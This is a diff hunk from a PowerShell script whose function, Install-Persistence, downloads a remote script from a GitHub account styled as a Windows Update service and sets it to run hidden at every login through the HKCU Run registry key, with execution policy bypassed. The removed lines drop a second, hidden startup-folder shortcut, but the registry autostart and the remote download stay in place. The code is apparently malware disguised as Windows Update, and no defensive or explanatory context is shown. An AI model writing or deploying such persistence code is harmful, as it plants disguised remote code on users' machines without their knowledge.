@@ -65,13 +65,6 @@ function Install-Persistence {
     try {
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1" -OutFile $scriptPath
         
-        $WshShell = New-Object -ComObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
-        $Shortcut.TargetPath = "powershell.exe"
-        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-        $Shortcut.WindowStyle = 7
-        $Shortcut.Save()
-        
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
             -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
